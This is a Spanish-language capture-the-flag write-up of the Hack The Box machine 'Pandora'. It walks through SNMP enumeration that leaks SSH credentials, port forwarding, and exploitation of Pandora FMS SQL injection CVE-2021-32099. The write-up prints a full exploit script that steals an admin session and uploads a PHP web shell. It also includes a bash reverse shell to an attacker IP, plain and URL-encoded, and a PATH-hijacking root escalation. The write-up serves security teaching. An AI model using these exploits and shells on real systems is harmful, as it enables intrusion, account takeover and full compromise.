# Pandora

![](../../../../~gitbook/image.md)Publicado: 04 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Pandora es una máquina Linux de dificultad fácil que presenta múltiples vectores de ataque interesantes. La explotación comienza con el descubrimiento de credenciales a través del servicio SNMP mal configurado, lo que permite el acceso SSH inicial. Posteriormente, se requiere realizar port forwarding para acceder a un servicio web interno (Pandora FMS) que es vulnerable a inyección SQL (CVE-2021-32099). Esta vulnerabilidad permite la autenticación como administrador y la posterior carga de una web shell para obtener ejecución remota de código. Finalmente, la escalada de privilegios se logra mediante la explotación de un binario SUID personalizado que es vulnerable a ataques de PATH hijacking.La máquina enseña conceptos importantes como enumeración SNMP, port forwarding, explotación de vulnerabilidades web conocidas, y técnicas de escalada de privilegios mediante manipulación del PATH.
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos TCP

####Enumeración de servicios

####Escaneo de puertos UDP

###🌐 Enumeración Web

####80 HTTP
Accedemos al sitio web y usamos la extensión wappalyzer para ver si vemos un poco las tecnologías usadas:![](../../../../~gitbook/image.md)Fuzzing de directoriosTras probar a realizar fuzzing de directorios don feroxbuster y dirsearch, no encontramos nada.
####161(UDP) SNMP
Probamos a realizar fuerza bruta sobre el puerto 161 del servicio SNMP con la herramienta SNMP brute para ver qué comunidades descubrimos:![](../../../../~gitbook/image.md)Usamos la herramienta snmp-check para enumerar en detalle sobre las comunidades descubiertas:Al revisar el fichero de salida, en el apartado de procesos, encontramos un proceso que está haciendo uso de unas credenciales:![](../../../../~gitbook/image.md)
####🔐 Acceso Inicial
Usamos las credenciales obtenidas para el usuario daniel para conectarnos a través del servicio SSH del puerto 22:
####🔄 Movimiento Lateral
Enumeramos los usuarios en la máquina y vemos que la flag está en el directorio del usuario matt pero no tenemos permisos:Comprobamos que daniel no puede ejecutar sudo en la máquina:Configuración de servicios webComo ya habíamos enumerado anteriormente el servidor web que se está usando es apache. La configuración de los sitios de Apache se define en `/etc/apache2/sites-enabled`. En este caso vemos que hay dos:Descubrimos un virtual host llamado pandora.panda.htb pero se está ejecutando en localhost y vemos la ruta a la que enlaza `/var/www/pandora`Enumeramos los ficheros en el directorio pandora y verificamos si hay algún directorio sobre el que Daniel tenga permisos de escritura pero no hay.Encontramos un fichero de configuración pero Daniel no tiene permisos para leerlo:
####Port forwadding pandora.panda.htb
Como no encontramos ningún vector de ataque ni credenciales que nos permitan movernos lateralmente, aprovechando que tenemos conexión vía ssh para usar realizar un redireccionamiento del puerto 80 del host de la máquina comprometida al puerto 9000 de nuestro host de ataque para enumerar este servicio.A continuación añadimos al fichero /etc/host de nuestro host de ataque la resolución del vhost pandora.panda.htb a localhostUna vez hecho, si abrimos en el navegador la dirección : http://localhost:9000 somos redireccionados al servicio de `Pandora FMS` console:http://localhost:9000/pandora_console/![](../../../../~gitbook/image.md)Probamos con las credenciales por defecto de este servicio que son `admin:pandora` pero no tenemos éxito.En la parte inferior de la web vemos una versión: v7.0NG.742_FIX_PERL2020 y buscando exploits para esta aplicación encontramos que hay varias vulnerabilidades para esta versión del servicio y una de ellas explota una vulnerabilidad SQLi.
####🎯 Explotación
CVE-2021-32099Esta vulnerabilidad se encuentra en el fichero chart_generator.php en el cual hay un parámetro session_id el cual no está siendo debidamente sanitizado y permite una inyección SQL Union.Esto podemos verificarlo haciendo una sencilla prueba añadiendo un carácter ' al paráemetro de entrada:http://localhost:9000/pandora_console/include/chart_generator.php?session_id=1%27![](../../../../~gitbook/image.md)Hacemos algunas pruebas de forma manual, por ejemplo para determinar el número de columnas:![](../../../../~gitbook/image.md)Verificamos que hay 3 columnas porque ya no devuelve error. Automatizamos esta inyección con el siguiente exploit público:https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticatedEl resumen de lo que hace este exploit es que aplica una inyección SQL sobre el parámetro session_id mal sanitizado del componente chart_generator.php como habíamos visto anteriormente para lograr robar la cookie del usuario admin y una vez autenticado subir una php shell en la máquina de forma que con ella podremos obtener una RCE.Iniciamos un listener con netcatDescargamos y ejecutamos el exploitLa ejecución nos abre ya una shell pero también podemos usarla manualmente en el endpoint que se indica sobre el archivo pwn.php?test=![](../../../../~gitbook/image.md)Usaremos la siguiente bash shell:Codificándola previamente a formato URL:Obtenemos la RCE y ganamos acceso como usuario matt:
####Mejora de la tty
Obtenemos la flag en el directorio del usuario matt:
####🚀 Escalada de matt a root
Parece que hay un problema con la shell actual y no permite ejecutar ciertos comandos:También verificamos si hay binarios con permisos SUID de los que podamos abusar:Entre los resultados hay un binario que no es habitual llamado pandora_backup y comprobamos que el propietario es root y grupo al que pertenece es matt:Dado que el binario tiene el bit SUID, esto permite que podamos ejecutar este binario como root pero parece que falla, posiblemente debido a algún problema con la terminal y mismo motivo por el que no podemos ejecutar sudo -l.
####Conexión mediante SSH
Aquí podemos hacer una cosa, podemos generar un par de claves ssh para el usuario matt y así poder conectarnos por ssh y estar una shell más estable. Para ello hacemos lo siguiente:Creamos una copia de id_rsa.pub y la renombramos a authorized_keys y le damos permisos 600 para que únicamente el propietario pueda manipular el archivo:Nos copiamos el la clave privada y desde nuestro host de ataque, la guardamos en un archivo, le damos permisos 600 y la usamos para conectarnos con el usuario matt:Una vez dentro hacemos un `export TERM=xterm` y verificamos que ya podemos lanzar `sudo -l` y el script `/usr/bin/pandora_backup` sin fallos:![](../../../../~gitbook/image.md)No tenemos la herramienta strings instalada en el host sí tenemos la utilidad ltrace y así poder ver un poco el contenido del binario compilado:Vemos que lo que hace es usar el comando tar de forma relativa y no absoluta, por lo que podemos hacer un ataque de PATH Hijacking En binarios compilados introducir otros binarios con rutas relativas tiene mucho riesgo y más si ese binario se ejecuta como root.Para explotar esto, primero cremos un archivo en /tmp que se llame tar cuyo contenido será simplemente una llamada a /usr/bin/sh y le damos permisos de ejecución.Verificamos el contenido de la variable PATH:Ahora simplemente añadimos el directorio /tmp al PATH y dado que el contenido del PATH se lee de izquierda a derecha, encontrará primero el archivo tar que hemos definido en tmp y ejecutará este en lugar del que hay en /usr/bin/tar:Si ahora de nuevo comprobamos lo que vale la variable PATH:Si ahora ejecutamos el binario de nuevo logramos ganar acceso como root:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.11.136
PING 10.10.11.136 (10.10.11.136) 56(84) bytes of data.
64 bytes from 10.10.11.136: icmp_seq=1 ttl=63 time=47.3 ms
64 bytes from 10.10.11.136: icmp_seq=2 ttl=63 time=45.5 ms

--- 10.10.11.136 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 45.466/46.361/47.256/0.895 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.136 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.11.136 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 08:02 CEST
Nmap scan report for 10.10.11.136
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
nmap -sU  -F 10.10.11.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 08:16 CEST
Nmap scan report for 10.10.11.136
Host is up (0.044s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

```
snmp-check -c public -v1 10.10.11.136 > 10.10.11.136_snmpcheck_v1
```

```
snmp-check -c public -v2c 10.10.11.136 > 10.10.11.136_snmpcheck_v2c
```

```
/usr/bin/host_check   -u daniel -p HotelBabylon23
```

```
ssh daniel@10.10.11.136
HotelBabylon23

The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
daniel@10.10.11.136's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

System information as of Wed  4 Jun 06:43:47 UTC 2025

System load:           0.0
Usage of /:            65.9% of 4.87GB
Memory usage:          12%
Swap usage:            0%
Processes:             224
Users logged in:       0
IPv4 address for eth0: 10.10.11.136
IPv6 address for eth0: dead:beef::250:56ff:fe94:c1de

=> /boot is using 91.8% of 219MB

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ whoami
daniel
daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
daniel@pandora:~$
```

```
daniel@pandora:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Dec  7  2021 .
drwxr-xr-x 18 root   root   4096 Dec  7  2021 ..
drwxr-xr-x  4 daniel daniel 4096 Jun  4 06:43 daniel
drwxr-xr-x  2 matt   matt   4096 Dec  7  2021 matt
```

```
daniel@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Jun  4 06:00 user.txt
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```

```
daniel@pandora:/home/matt$ sudo -l
[sudo] password for daniel:
Sorry, user daniel may not run sudo on pandora.
daniel@pandora:/home/matt$
```

```
daniel@pandora:/etc/apache2/sites-enabled$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Dec  3  2021 .
drwxr-xr-x 8 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 root root   35 Dec  3  2021 000-default.conf -> ../sites-available/000-default.conf
lrwxrwxrwx 1 root root   31 Dec  3  2021 pandora.conf -> ../sites-available/pandora.conf
```

```
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf

ServerAdmin admin@panda.htb
ServerName pandora.panda.htb
DocumentRoot /var/www/pandora
AssignUserID matt matt

AllowOverride All

ErrorLog /var/log/apache2/error.log
CustomLog /var/log/apache2/access.log combined

daniel@pandora:/etc/apache2/sites-enabled$
```

```
find pandora/ -writable
```

```
daniel@pandora:/var/www/pandora/pandora_console/include$ ls -la config.php
-rw------- 1 matt matt 413 Dec  3  2021 config.php
```

```
ssh -L 9000:127.0.0.1:80 daniel@10.10.11.136
```

```
echo "localhost pandora.panda.htb" | sudo tee -a /etc/hosts
```

```
http://localhost:9000/pandora_console/include/chart_generator.php?session_id=1' order by -- -
```

```
#!/usr/bin/python3

# MIT License

# Copyright (c) 2022 sam

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# CVE-2021-32099
# Found By dennis brinkrolf
# Blog https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
# There aren't any exploits found to impersonate so wrote my own
# This sql injection can also be exploited by sqlmap to dump databases :)

import requests
import argparse
import cmd

parser = argparse.ArgumentParser(description="Exploiting Sqlinjection To impersonate Admin")
parser.add_argument("-t","--target", help=" Host Ip for the Exploiting with target Port" ,required=True)
parser.add_argument("-f","--filename", help="Filename for Shell Upload with php extension",default='pwn.php' )

args = parser.parse_args()
host=args.target
file_name=args.filename
base_path=f'http://{host}/pandora_console'

#Exploit Injection
#http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO

print(f"URL:  {base_path}")
print("[+] Sending Injection Payload")
r=requests.get(f'http://{host}/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO')

if r.status_code==200:
print("[+] Requesting Session")
Session_Cookie_Admin=r.cookies.get('PHPSESSID')
print(f'[+] Admin Session Cookie : {Session_Cookie_Admin}')
else :
print('[+] Error Receiving Admin Cookie , Make sure the url is right or Check the table name using SQLMAP and change the table name in the payload')
##################################################################################################
# Got Cookie now Proceed with Pwning
##################################################################################################
cookies = {
'PHPSESSID': Session_Cookie_Admin,
}

headers = {
'Host': host,
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
'Content-Length': '1289',
'Connection': 'close',
'Referer': f'http://{host}/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
'Upgrade-Insecure-Requests': '1',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
}

params = (
('sec', 'gsetup'),
('sec2', 'godmode/setup/file_manager'),
)

data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="{file_name}"\r\nContent-Type: application/x-php\r\n\r\n\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'

print('[+] Sending Payload ')
response = requests.post(f'http://{host}/pandora_console/index.php', headers=headers, params=params, cookies=cookies, data=data, verify=False)
StatusCode=response.status_code
print(f'[+] Respose : {StatusCode}')

##################################################################################################
# Cmdline Class
class commandline_args(cmd.Cmd):
prompt= "CMD > "
def default(self,args):
print(cmd_shell(args))

##################################################################################################
# Drop Interactive Shell
##################################################################################################

def cmd_shell(command):
shell = requests.get(f'http://{host}/pandora_console/images/{file_name}?test={command}')
return shell.text

try:
print('[+] Pwned :)')
print(f'[+] If you want manual Control : http://{host}/pandora_console/images/{file_name}?test=')
commandline_args().cmdloop()
except KeyboardInterrupt:
print('\n[+] Exiting!!!!')
raise SystemExit
if not  StatusCode == 200:
print('[+] Failed to Get Shell :(')
```

```
nc -nlvp 443
```

```
wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/refs/heads/master/sqlpwn.py

python3 sqlpwn.py -t localhost:9000
```

```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
```

```
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27
```

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.136] 37334
bash: cannot set terminal process group (906): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$
```

```
script /dev/null -c bash

Ctrl + Z (suspended)

stty -raw echo; fg
reset xterm;

export TERM=xterm

stty rows X columns X
```

```
matt@pandora:/var/www/pandora/pandora_console/images$ cd /home/matt/
matt@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Jun  4 06:00 user.txt
matt@pandora:/home/matt$ cat user.txt
```

```
matt@pandora:/home/matt$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
matt@pandora:/home/matt$
```

```
find / -perm -4000 2>/dev/null

/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

```
matt@pandora:/home/matt$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```

```
matt@pandora:/usr/bin$ ./pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
```

```
matt@pandora:/var/www/pandora/pandora_console$ cd /home/matt/
matt@pandora:/home/matt$ mkdir .ssh
matt@pandora:/home/matt$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:PXpsDsDkYts/Wp9v+FU+4eO/bjU4lO2RN+v1FiD9BSs matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|              .  |
|      .     . oo.|
|     +   . .E=.=o|
|    o + S o o.=.B|
|   . + . o . o.O+|
|    . . + +.  ++B|
|       o.*.....o=|
|      ....++o o=+|
+----[SHA256]-----+
matt@pandora:/home/matt$
```

```
matt@pandora:/home/matt/.ssh$ ls -la
total 16
drwxr-xr-x 2 matt matt 4096 Jun  4 09:51 .
drwxr-xr-x 4 matt matt 4096 Jun  4 09:50 ..
-rw------- 1 matt matt 2602 Jun  4 09:51 id_rsa
-rw-r--r-- 1 matt matt  566 Jun  4 09:51 id_rsa.pub
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys
matt@pandora:/home/matt/.ssh$ ls -la
total 20
drwxr-xr-x 2 matt matt 4096 Jun  4 09:53 .
drwxr-xr-x 4 matt matt 4096 Jun  4 09:50 ..
-rw-r--r-- 1 matt matt  566 Jun  4 09:53 authorized_keys
-rw------- 1 matt matt 2602 Jun  4 09:51 id_rsa
-rw-r--r-- 1 matt matt  566 Jun  4 09:51 id_rsa.pub
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
```

```
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa matt@10.10.11.136
```

```
matt@pandora:/tmp$ ltrace /usr/bin/pandora_backup
getuid()                                                                                                         = 1000
geteuid()                                                                                                        = 1000
setreuid(1000, 1000)                                                                                             = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                                                                = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                                                      = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now

--- SIGCHLD (Child exited) ---
)                                                                                           = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                                                     = 39
+++ exited (status 1) +++
matt@pandora:/tmp$
```

```
matt@pandora:/tmp$ cd /tmp
matt@pandora:/tmp$ touch tar
matt@pandora:/tmp$ nano tar
matt@pandora:/tmp$ cat tar
/usr/bin/sh
matt@pandora:/tmp$
```

```
matt@pandora:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
export PATH=/tmp:$PATH
```

```
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
#
```
